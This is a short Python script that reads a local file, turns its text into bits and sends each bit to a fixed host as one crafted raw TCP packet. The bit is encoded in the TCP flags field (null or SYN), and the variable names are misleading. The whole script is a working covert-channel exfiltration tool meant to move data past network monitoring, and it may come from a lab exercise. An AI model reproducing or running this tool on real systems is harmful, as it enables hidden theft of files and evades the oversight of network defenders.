import socket
import random
import struct
import os

with open("file.txt", "r") as file:
    text = file.read()


random_jsuiadjasiqwiu = text

def create_ip_header(src_ip, dst_ip):
    ip_ver = 4  
    ip_ihl = 5 
    ip_dscp_ecn = 0  
    ip_total_length = 40  
    ip_id = os.urandom(2)  
    ip_frag_off = 0   
    ip_ttl = 64  
    ip_proto = socket.IPPROTO_TCP  
    ip_checksum = 0  
    ip_saddr = socket.inet_aton(src_ip)  
    ip_daddr = socket.inet_aton(dst_ip)  

    ip_header = struct.pack('!BBHHHBBH4s4s', 
                            (ip_ver << 4) + ip_ihl, ip_dscp_ecn,
                            ip_total_length, int.from_bytes(ip_id, byteorder='big'), ip_frag_off,
                            ip_ttl, ip_proto, ip_checksum,
                            ip_saddr, ip_daddr)
    return ip_header

def create_tcp_header(src_port, dst_port, seq, ack_seq, secrets):
    tcp_src_port = src_port
    tcp_dst_port = dst_port
    tcp_seq = seq
    tcp_ack_seq = ack_seq
    tcp_data_offset = 5  
    tcp_reserved = 0
    tcp_secrets = secrets
    tcp_window = socket.htons(5840)
    tcp_checksum = 0
    tcp_urg_ptr = 0
    tcp_offset_res = (tcp_data_offset << 4) + tcp_reserved
    tcp_header = struct.pack('!HHLLBBHHH', 
                             tcp_src_port, tcp_dst_port, tcp_seq, tcp_ack_seq,
                             tcp_offset_res, tcp_secrets, tcp_window, tcp_checksum, tcp_urg_ptr)
    
    return tcp_header



nothing = ''.join(format(ord(ab), '08b') for ab in random_jsuiadjasiqwiu)



def send_tcp_packet(src_ip, dst_ip, src_port, dst_port, secrets):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    seq = 0
    ack_seq = 0
    tcp_secrets = secrets  
    tcp_header = create_tcp_header(src_port, dst_port, seq, ack_seq, tcp_secrets)
    ip_header = create_ip_header(src_ip, dst_ip)

    packet = ip_header + tcp_header
    sock.sendto(packet, (dst_ip, dst_port))
    sock.close()


src_ip = '192.168.0.110'
dst_ip = '192.168.99.205'
dst_port = 80


for space in nothing:
    src_port = random.sample(range(10000,50000), 1)[0]
    if space == "0":
        tcp_secrets = 0x00 # is something  
    else:
        tcp_secrets = 0x02 # is nothing
    send_tcp_packet(src_ip, dst_ip, src_port, dst_port, tcp_secrets)
